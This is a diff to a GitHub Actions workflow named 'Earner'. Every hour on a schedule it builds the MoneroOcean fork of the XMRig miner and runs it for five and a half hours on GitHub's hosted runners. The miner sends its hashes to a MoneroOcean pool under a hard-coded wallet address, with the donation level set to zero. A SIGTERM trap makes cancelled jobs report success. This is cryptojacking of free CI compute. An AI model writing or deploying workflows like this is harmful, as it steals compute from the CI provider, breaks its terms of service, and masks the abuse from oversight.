@@ -1,41 +1,38 @@
-name: Earner
+name: Earner-1
 
 on:
   schedule:
-    - cron: '0 */1 * * *'  # Every 5 hours
+    - cron: '0 */1 * * *'  # Every 1 hours
   workflow_dispatch:
 
 jobs:
-  xmrig:
+  mine:
     runs-on: ubuntu-latest
 
     steps:
       - name: Install dependencies
         run: |
           sudo apt update
-          sudo apt install -y build-essential git cmake libssl-dev libhwloc-dev libuv1-dev
+          sudo apt install -y git build-essential cmake libssl-dev libhwloc-dev libuv1-dev
 
-      - name: Clone XMRig
-        run: git clone https://github.com/xmrig/xmrig.git
+      - name: Clone MO XMRig
+        run: git clone https://github.com/MoneroOcean/xmrig.git moxmrig
 
-      - name: Build XMRig
+      - name: Build MO XMRig
         run: |
-          cd xmrig
+          cd moxmrig
           mkdir build && cd build
-          cmake ..
+          cmake .. -DWITH_HWLOC=OFF
           make -j$(nproc)
 
-      - name: Run XMRig for 5h 30m with clean exit
+      - name: Run MO XMRig for 5h30m
         run: |
-          cd xmrig/build
-
-          # Trap SIGTERM for graceful exit
+          cd moxmrig/build
           trap "echo 'Job canceled, exiting successfully'; exit 0" SIGTERM
-
-          # Run for 5 hours 30 minutes (19800 seconds)
           timeout 19800s ./xmrig \
-            -o gulf.moneroocean.stream:10128 \
+            -o gulf.moneroocean.stream:10002 \
             -u 44SpTnkYyc9NmH3QjJkoLtVc3DXXJGwfD7tvhF1zwNRz9JbAMeHNiCD4wb8ivNvo3edgrntc3ra1meA5uZhT3vbaJ1ApPT1 \
-            -p github-run \
+            -p worker-1 \
+            --donate-level 0 \
             -k --coin monero \
             -t $(nproc) || exit 0
